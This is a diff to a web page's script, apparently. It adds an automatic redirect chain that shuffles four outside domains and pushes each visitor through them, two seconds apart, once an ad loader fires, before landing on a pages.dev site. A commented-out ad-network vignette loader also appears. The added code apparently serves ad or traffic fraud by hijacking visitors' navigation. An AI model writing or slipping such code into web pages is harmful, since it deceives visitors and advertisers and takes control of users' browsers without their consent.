@@ -30,15 +30,47 @@
     
     
 <script>
-let loadedCount = 0;
-const totalScripts = 1;
-function onScriptLoad() {
-    loadedCount++;
-    if (loadedCount === totalScripts) {
-        setTimeout(() => {
-            window.location.href = 'https://testss-3c9.pages.dev/';
-        }, 4000);
+const domains = ['https://glimmerbyte.com/', 'https://healthyhumansource.com/', 'https://anylinks.in/', 'https://eduprothink.com/'];
+
+function shuffle(array) {
+  for (let i = array.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [array[i], array[j]] = [array[j], array[i]];
+  }
+  return array;
+}
+
+let params = new URLSearchParams(window.location.search);
+let order = params.get('order');
+let index = parseInt(params.get('index')) || 0;
+
+if (!order) {
+  order = shuffle([...domains]);
+  index = 0;
+} else {
+  order = order.split(',');
+}
+
+const adScript = document.getElementById('AdsCoreLoader97547');
+
+function handleRedirect() {
+  setTimeout(() => {
+    if (index < order.length - 1) {
+      index++;
+      const nextUrl = order[index] + '?order=' + order.join(',') + '&index=' + index;
+      window.location.href = nextUrl;
+    } else {
+      window.location.href = 'https://testss-3c9.pages.dev/';
     }
+  }, 2000);
+}
+
+if (adScript) {
+  adScript.addEventListener('load', handleRedirect);
+  adScript.addEventListener('error', handleRedirect);
+} else {
+  // Fallback if script not found
+  handleRedirect();
 }
 </script>
 <!--     <script>(function(s){s.dataset.zone='10190027',s.src='https://gizokraijaw.net/vignette.min.js'; s.addEventListener('load', onScriptLoad); s.addEventListener('error', onScriptLoad);})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
